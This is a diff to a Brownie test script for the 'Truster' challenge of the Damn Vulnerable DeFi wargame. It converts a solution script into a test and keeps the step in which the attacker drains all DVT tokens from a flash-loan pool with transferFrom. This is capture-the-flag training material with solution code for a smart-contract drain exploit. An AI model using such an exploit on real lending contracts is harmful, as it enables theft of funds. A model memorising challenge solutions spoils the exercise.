@@ -1,13 +1,10 @@
 from scripts.helper.utils import *
 from brownie import DamnValuableToken, TrusterLenderPool
 
-def main():
+def test_solve_challenge():
     ####################################################################
     ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
     ####################################################################
-
-    # starting setup messages
-    message('setup_start')
 
     # tokens in pool
     TOKENS_IN_POOL = ether_to_wei(1000000)
@@ -27,25 +24,15 @@ def main():
     assert token.balanceOf(attacker.address) == 0
 
     # check if solved
-    def solution_assertion():
-        message('final_assertion_check')
-        try:
+    def check_solution():
+        ############################################
+        ############ SUCCESS CONDITIONS ############
+        ############################################
 
-            ############################################
-            ############ SUCCESS CONDITIONS ############
-            ############################################
+        # It is no longer possible to execute flash loans
+        assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
+        assert token.balanceOf(pool.address) == 0
 
-            # Attacker has taken all tokens from the pool
-            assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
-            assert token.balanceOf(pool.address) == 0
-            return True
-
-        except:
-            return False
-
-    # done setting up
-    message('setup_end')
-    message('solution_start')
 # #########################################################
 # More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
 #
@@ -66,9 +53,6 @@ def main():
 
     # take all the tokens from the pool
     token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL, _fromAttacker)
-        
-###############################################################
-###################### CHECKING SOLUTION ######################
-###############################################################
-    message('solution_end')
-    print(f'Challenge is solved: {solution_assertion()}')
+    
+    ######################
+    check_solution()
